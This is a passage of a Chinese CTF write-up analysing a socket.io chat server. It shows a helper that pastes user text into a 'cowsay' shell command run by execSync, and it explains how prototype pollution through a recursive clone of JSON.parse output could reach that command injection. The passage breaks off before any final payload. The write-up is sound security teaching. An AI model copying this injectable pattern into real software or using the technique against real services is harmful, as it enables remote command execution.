message'</span>,msg,<span class="hljs-string">' from'</span>, </span><br><span class="line">                clientManager.getUsername(<span class="hljs-keyword">from</span>),<span class="hljs-string">'to'</span>,channel,<span class="hljs-string">'because he is not subscribed.'</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> clients = clientManager.getSubscribedToChannel(channel);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;clients.length;i++) &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">from</span> !== <span class="hljs-string">'string'</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span>(clients[i].id == <span class="hljs-keyword">from</span>.id) &#123;</span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        clients[i].emit(<span class="hljs-string">'message'</span>, msg);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// console.log(msg)</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">io.on(<span class="hljs-string">'connection'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">client</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"someone connecting..."</span>);</span><br><span class="line">    client.on(<span class="hljs-string">'register'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">inUser</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            newUser = helper.clone(<span class="hljs-built_in">JSON</span>.parse(inUser))</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n[*] newUser = "</span> + <span class="hljs-built_in">JSON</span>.stringify(newUser) + <span class="hljs-string">"\n"</span>);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n[*] newUser.__proto__ = "</span> + <span class="hljs-built_in">JSON</span>.stringify(newUser.__proto__) + <span class="hljs-string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span>(!helper.validUser(newUser)) &#123;</span><br><span class="line">                sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                    <span class="hljs-string">'Invalid settings.'</span>)</span><br><span class="line">                <span class="hljs-keyword">return</span> client.disconnect();</span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.keys(defaultSettings);</span><br><span class="line">            <span class="hljs-comment">// 如果用户没有设定就是用默认设置</span></span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">                <span class="hljs-keyword">if</span>(newUser[keys[i]] === <span class="hljs-literal">undefined</span>) &#123;</span><br><span class="line">                    newUser[keys[i]] = defaultSettings[keys[i]]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (!clientManager.isUserAvailable(newUser.name)) &#123;</span><br><span class="line">                sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                    newUser.name + <span class="hljs-string">' is not available'</span>)</span><br><span class="line">                <span class="hljs-keyword">return</span> client.disconnect(); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-comment">// 保存 socket跟user 的关联</span></span><br><span class="line">            clientManager.registerClient(client, newUser);</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">return</span> sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                newUser.name + <span class="hljs-string">' registered'</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    client.on(<span class="hljs-string">'join'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">channel</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            clientManager.joinChannel(client, channel);</span><br><span class="line"></span><br><span class="line">            sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                <span class="hljs-string">"You joined channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">            <span class="hljs-keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">            sendMessageToChannel(channel,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                helper.getAscii(<span class="hljs-string">"User "</span> + u + <span class="hljs-string">" living in "</span> + c + <span class="hljs-string">" joined channel"</span>))</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    client.on(<span class="hljs-string">'leave'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">channel</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            client.join(channel);</span><br><span class="line">            clientManager.leaveChannel(client, channel);</span><br><span class="line">            sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">                <span class="hljs-string">"You left channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">            <span class="hljs-keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">            sendMessageToChannel(channel, <span class="hljs-string">"Server"</span>, </span><br><span class="line">                helper.getAscii(<span class="hljs-string">"User "</span> + u + <span class="hljs-string">" living in "</span> + c + <span class="hljs-string">" left channel"</span>))</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    client.on(<span class="hljs-string">'message'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            message = <span class="hljs-built_in">JSON</span>.parse(message);</span><br><span class="line">            <span class="hljs-keyword">if</span>(message.channel === <span class="hljs-literal">undefined</span>) &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(clientManager.getUsername(client),<span class="hljs-string">"said:"</span>, message.msg);</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                sendMessageToChannel(message.channel, client, message.msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    client.on(<span class="hljs-string">'disconnect'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'client disconnect...'</span>, client.id)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> oldclient = clientManager.removeClient(client);</span><br><span class="line">            <span class="hljs-keyword">if</span>(oldclient !== <span class="hljs-literal">undefined</span>) &#123;</span><br><span class="line">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [channel, state] <span class="hljs-keyword">of</span> <span class="hljs-built_in">Object</span>.entries(oldclient.ch)) &#123;</span><br><span class="line">                    <span class="hljs-keyword">if</span>(!state) <span class="hljs-keyword">continue</span>;</span><br><span class="line">                    sendMessageToChannel(channel, <span class="hljs-string">"Server"</span>, </span><br><span class="line">                        <span class="hljs-string">"User "</span> + oldclient.u.name + <span class="hljs-string">" left channel"</span>);</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  client.on(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'received error from client:'</span>, client.id)</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(err)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'listening on port 3000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;客户端代码:<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> io = <span class="hljs-built_in">require</span>(<span class="hljs-string">'socket.io-client'</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> socket = io.connect(<span class="hljs-string">'http://192.168.142.128:3000'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span>(process.argv.length != <span class="hljs-number">4</span>) &#123;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'name and channel missing'</span>)</span><br><span class="line">   process.exit()</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">'Logging as '</span> + process.argv[<span class="hljs-number">2</span>] + <span class="hljs-string">' on '</span> + process.argv[<span class="hljs-number">3</span>])</span><br><span class="line"><span class="hljs-keyword">var</span> inputUser = &#123;</span><br><span class="line">  name: process.argv[<span class="hljs-number">2</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">socket.on(<span class="hljs-string">'message'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(msg.from,<span class="hljs-string">"["</span>, msg.channel!==<span class="hljs-literal">undefined</span>?msg.channel:<span class="hljs-string">'Default'</span>,<span class="hljs-string">"]"</span>, <span class="hljs-string">"says:\n"</span>, msg.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">socket.on(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'received socket error:'</span>)</span><br><span class="line">  <span class="hljs-built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">socket.emit(<span class="hljs-string">'register'</span>, <span class="hljs-built_in">JSON</span>.stringify(inputUser);</span><br><span class="line">socket.emit(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">"hello"</span> &#125;));</span><br><span class="line">socket.emit(<span class="hljs-string">'join'</span>, process.argv[<span class="hljs-number">3</span>]);<span class="hljs-comment">//ps: you should keep your channels private</span></span><br><span class="line">socket.emit(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">channel</span>: process.argv[<span class="hljs-number">3</span>], <span class="hljs-attr">msg</span>: <span class="hljs-string">"hello channel"</span> &#125;));</span><br><span class="line">socket.emit(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">channel</span>: <span class="hljs-string">"hhhh"</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">"i own you"</span> &#125;));</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以看到整个应用是一个socket.io实现的聊天室。代码看下来并没有发现数据库、flag的配置或定义，但在helper.js里看到一个命令执行的地方：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getAscii: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n******************************"</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> command = <span class="hljs-string">"cowsay '"</span> + message + <span class="hljs-string">"'"</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(command);</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"******************************\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> e.execSync(command).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;所以目的就是通过命令执行拿到flag。</p><p>&emsp;&emsp;在server.js里我们发现只有两处调用了getAscii()<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">client.on(<span class="hljs-string">'join'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">channel</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">        clientManager.joinChannel(client, channel);</span><br><span class="line"></span><br><span class="line">        sendMessageToClient(client,<span class="hljs-string">"Server"</span>, </span><br><span class="line">            <span class="hljs-string">"You joined channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">        <span class="hljs-keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">        sendMessageToChannel(channel,<span class="hljs-string">"Server"</span>, </span><br><span class="line">            helper.getAscii(<span class="hljs-string">"User "</span> + u + <span class="hljs-string">" living in "</span> + c + <span class="hljs-string">" joined channel"</span>))</span><br><span class="line">    &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;看起来我们只需要控制username和country就能命令注入，但继续审计发现，出了name,其他属性，如country, lastname等都不允许出现，而且对name也有严格检查(<code>/^[a-z0-9]+$/gi</code>)，检查代码：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// helper.js</span></span><br><span class="line">...</span><br><span class="line">validUser: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">inp</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> block = [<span class="hljs-string">"source"</span>,<span class="hljs-string">"port"</span>,<span class="hljs-string">"font"</span>,<span class="hljs-string">"country"</span>,</span><br><span class="line">                 <span class="hljs-string">"location"</span>,<span class="hljs-string">"status"</span>,<span class="hljs-string">"lastname"</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> inp !== <span class="hljs-string">'object'</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.keys( inp);</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt; keys.length; i++) &#123;</span><br><span class="line">        key = keys[i];</span><br><span class="line">        <span class="hljs-comment">// 检查属性</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(block.indexOf(key) !== <span class="hljs-number">-1</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> r =<span class="hljs-regexp">/^[a-z0-9]+$/gi</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(inp.name === <span class="hljs-literal">undefined</span> || !r.test(inp.name)) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;看起来这里我们也控制不了。</p><h2 id="Prototype-pollution-attack"><a href="#Prototype-pollution-attack" class="headerlink" title="Prototype pollution attack"></a>Prototype pollution attack</h2><p>&emsp;&emsp;这里我们需要使用原型污染（Prototype pollution attack）的攻击方法。</p><p>&emsp;&emsp;说原型污染前我们先了解一下JS里的<code>原型继承</code>的原理。</p><blockquote><p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object ）都有一个私有属性（称之为 <strong>proto</strong>）指向它的原型对象（prototype）。该原型对象也有一个自己的原型对象 ，层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</p></blockquote><blockquote><p>当我们o = new F 创建一个实例o的时候，会给o添加一个<strong>proto</strong>属性，通过<strong>protp</strong>会找到 F.prototype,也就是所属类的原型。<br>当我们通过o访问一个属性的时候，比如o.name,会先在实例o上查找，没有的话js会通过<strong>proto</strong>去类的原型上找，由于原型也是一个对象，它也有<strong>proto</strong>属性，默认会找到Object的原型。所以，当我们的Child类想通过继承访问Super类上的属性/方法，可以通过设置Child的原型，能访问到Super的原型，就可以访问Super类的公用属性和方法了。</p></blockquote><p>&emsp;&emsp;上面两段是截取网上感觉说得比较好的解释。对于JS的原型链我们可以用c/c++里的继承辅助理解，但不同的是js是单继承的，所以只能形成<code>链状</code>，这不同于C/C++的多继承。</p><p>&emsp;&emsp;我们可以通过下面的例子理解一下:<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">&#123;&#125;</span><br><span class="line">b = &#123;&#125;</span><br><span class="line">&#123;&#125;</span><br><span class="line">b[<span class="hljs-string">"__proto__"</span>]</span><br><span class="line">&#123;<span class="hljs-attr">constructor</span>: ƒ, <span class="hljs-attr">__defineGetter__</span>: ƒ, <span class="hljs-attr">__defineSetter__</span>: ƒ, <span class="hljs-attr">hasOwnProperty</span>: ƒ, <span class="hljs-attr">__lookupGetter__</span>: ƒ, …&#125;</span><br><span class="line">b[<span class="hljs-string">"__proto__"</span>][<span class="hljs-string">"admin"</span>] = <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-literal">true</span></span><br><span class="line">b[<span class="hljs-string">"admin"</span>]</span><br><span class="line"><span class="hljs-literal">true</span></span><br><span class="line">a[<span class="hljs-string">"admin"</span>]</span><br><span class="line"><span class="hljs-literal">true</span></span><br></pre></td></tr></table></figure></p><div align="center"><br>    <img src="/images/posts/dctf/1.png"><br></div><br>&emsp;&emsp;可以看到通过修改<code>b[&quot;__proto__&quot;]</code>的属性可以为a增加一个叫<code>admin</code>的属性。这里可以简单的把<code>b[&quot;__proto__&quot;]</code>理解为b(a)的父类，那么通过<code>b[&quot;__proto__&quot;][&quot;admin&quot;] = true</code>为父类增加了一个属性，在使用<code>a[&quot;admin&quot;]</code>的使用首先会从自身的属性里查找<code>admin</code>，如果没有则向上级类查找，从而在父类中得到admin的值。这跟c++的继承原理颇为相似。<br><br>## exploit<br>&emsp;&emsp;回过头看我们的题目环境，在helper.js里我们发现有个clone函数：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">clone: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> ||</span><br><span class="line">        obj === <span class="hljs-literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> newObj;</span><br><span class="line">    <span class="hljs-keyword">var</span> cloneDeep = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Array</span>.isArray(obj)) &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (Buffer.isBuffer(obj)) &#123;</span><br><span class="line">            newObj = <span class="hljs-keyword">new</span> Buffer(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Date</span>) &#123;</span><br><span class="line">            newObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(obj.getTime());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">RegExp</span>) &#123;</span><br><span class="line">            newObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> proto = <span class="hljs-built_in">Object</span>.getPrototypeOf(obj);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n[*] Object.getPrototypeOf(obj) = "</span> + <span class="hljs-built_in">JSON</span>.stringify(proto) + <span class="hljs-string">"\n"</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> (proto &amp;&amp;</span><br><span class="line">                proto.isImmutable) &#123;</span><br><span class="line"></span><br><span class="line">                newObj = obj;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                newObj = <span class="hljs-built_in">Object</span>.create(proto);</span><br><span class="line">                cloneDeep = <span class="hljs-literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        newObj = [];</span><br><span class="line">        cloneDeep = <span class="hljs-literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="hljs-keyword">if</span> (cloneDeep) &#123;</span><br><span class="line">        <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.getOwnPropertyNames(obj);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> key = keys[i];</span><br><span class="line">            <span class="hljs-keyword">var</span> descriptor = <span class="hljs-built_in">Object</span>.getOwnPropertyDescriptor(obj, key);</span><br><span class="line">            <span class="hljs-keyword">if</span> (descriptor &amp;&amp;</span><br><span class="line">                (descriptor.get ||</span><br><span class="line">                 descriptor.set)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="hljs-built_in">Object</span>.defineProperty(newObj, key, descriptor);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                newObj[key] = <span class="hljs-keyword">this</span>.clone(obj[key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> newObj;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;他会对传入的对象取出key，value，然后clone出一个新的object返回。根据代码，它实行的是深度拷贝(deep clone)，使用了for循环（keys.length）将所以的属性都拷贝一次（递归拷贝）。<br><br>&emsp;&emsp;所以我们可以尝试污染掉<code>inputUser = {...}</code>的上级父类(<strong>proto</strong>)。<br><br>&emsp;&emsp;题目中是<code>newUser = helper.clone(JSON.parse(inUser))</code>这样调用clone的，而JSON.parse跟<code>__proto__</code>会产生危险的反应，先上个例子：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="hljs-keyword">const</span> plainObj = &#123;</span><br><span class="line">  __proto__: &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;,</span><br><span class="line">  b: <span class="hljs-number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">&lt;<span class="hljs-literal">undefined</span></span><br><span class="line">&gt;plainObj</span><br><span class="line">&lt;&#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="line">&gt;plainObj.__proto__</span><br><span class="line">&lt;&#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>&#125;</span><br><span class="line">&gt;<span class="hljs-keyword">const</span> jsonString = <span class="hljs-string">`&#123;</span></span><br><span class="line"><span class="hljs-string">  "__proto__": &#123; "a": 1 &#125;,</span></span><br><span class="line"><span class="hljs-string">  "b": 2</span></span><br><span class="line"><span class="hljs-string">&#125;`</span>;</span><br><span class="line">&lt;<span class="hljs-literal">undefined</span></span><br><span class="line">&gt;<span class="hljs-keyword">const</span> parsedObj = <span class="hljs-built_in">JSON</span>.parse(jsonString);</span><br><span class="line">&lt;<span class="hljs-literal">undefined</span></span><br><span class="line">&gt;parsedObj</span><br><span class="line">&lt;&#123;<span 